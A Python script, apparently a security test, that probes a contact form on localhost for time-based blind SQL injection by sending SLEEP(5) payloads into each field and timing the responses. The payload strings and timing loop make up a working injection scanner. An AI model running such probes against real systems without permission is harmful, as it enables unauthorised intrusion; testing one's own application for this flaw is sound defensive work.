import sys, time
try:
    import requests
except ImportError:
    print("ERROR: requests module not available")
    sys.exit(1)

print("BLIND SQL INJECTION TEST")
print("="*50)

URL = "http://localhost/send.php"
PARAMS = ['fullname', 'email', 'phone', 'subject', 'message']
SLEEP_PAYLOADS = ["' OR SLEEP(5)-- ", "'; SLEEP(5);-- ", "') OR SLEEP(5);-- ", "' OR (SELECT SLEEP(5))--", "' UNION SELECT SLEEP(5)--", "'||(SELECT SLEEP(5))--"]
DATA = {'fullname':'Test','email':'test@test.com','phone':'555-0000','subject':'Test','message':'Test'}

def measure(data):
    start = time.time()
    try:
        r = requests.post(URL, data=data, timeout=15, allow_redirects=False)
        return time.time() - start, r.status_code
    except:
        return time.time() - start, 0

print("Establishing baseline...")
BL = []
for i in range(3):
    t,s = measure(DATA)
    BL.append(t)
    print(f"  Baseline {i+1}: {t:.3f}s (Status: {s})")

AVG = sum(BL)/len(BL)
THR = AVG + 4
print(f"Average: {AVG:.3f}s | Threshold: {THR:.3f}s\n")

print("Testing parameters...")
VULN = []
for param in PARAMS:
    print(f"\n[{param}]")
    for i,p in enumerate(SLEEP_PAYLOADS,1):
        test = DATA.copy()
        test[param] = p
        elapsed,status = measure(test)
        delay = elapsed - AVG
        marker = " <<< VULNERABLE" if delay >= 4 else ""
        print(f"  {i}: {elapsed:.3f}s delay ({delay:+.3f}s){marker}")
        if delay >= 4 and param not in VULN:
            VULN.append(param)

print("\n" + "="*50)
if VULN:
    print(f"VULNERABILITY CONFIRMED in: {VULN}")
else:
    print("NO VULNERABILITY DETECTED")
print("="*50)
